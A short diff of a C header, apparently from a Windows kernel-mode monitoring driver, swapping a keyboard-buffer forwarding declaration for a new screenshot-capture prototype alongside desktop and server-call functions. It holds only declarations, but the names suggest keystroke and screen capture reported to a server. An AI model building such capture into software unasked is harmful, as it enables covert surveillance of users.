@@ -49,11 +49,13 @@ NTSTATUS
 NTSTATUS
 	MonitorOpenDesktop(POPEN_DESKTOP openDesktop);
 
-VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry);
-
 
 PMONITOR
 	MonitorGetInstance(VOID);
 
 PSREQUEST
 	MonitorCallServer(PSREQUEST request);
+
+NTSTATUS
+MonitorScreenshot(PKMON_SCREENSHOT ScreenShot);
+
